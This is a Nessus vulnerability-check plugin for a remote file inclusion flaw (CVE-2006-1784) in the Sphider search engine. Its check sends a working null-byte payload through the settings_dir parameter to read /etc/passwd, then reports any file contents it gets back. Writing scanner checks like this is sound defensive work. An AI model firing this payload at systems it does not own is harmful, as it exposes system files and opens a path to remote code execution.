#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21229);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-1784");
  script_bugtraq_id(17514);
  script_xref(name:"OSVDB", value:"24586");

  script_name(english:"Sphider configset.php settings_dir Parameter Remote File Inclusion");
  script_summary(english:"Tries to read /etc/passwd using Sphider");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Sphider, an open-source web spider and
search engine written in PHP. 

The version of Sphider installed on the remote host fails to sanitize
user-supplied input to the 'settings_dir' parameter of the
'admin/configset.php' script before using it in a PHP 'include()'
function.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/sphider_poc.pl" );
 script_set_attribute(attribute:"see_also", value:"http://www.cs.ioc.ee/~ando/sphider/forum/board_entry.php?id=2643" );
 script_set_attribute(attribute:"solution", value:
"Edit the affected script as described in the vendor forum posting
referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/sphider", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/admin/configset.php?",
      "settings_dir=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # It's from Sphider and..
    "<td> Sphider version</td>" >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or "failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but an attacker with
      #     local access and/or remote file inclusion might still work.
      egrep(pattern:"main\(/etc/passwd\\0conf\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<div id='submenu'>");

    if (isnull(contents)) security_warning(port);
    else
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    exit(0);
  }
}
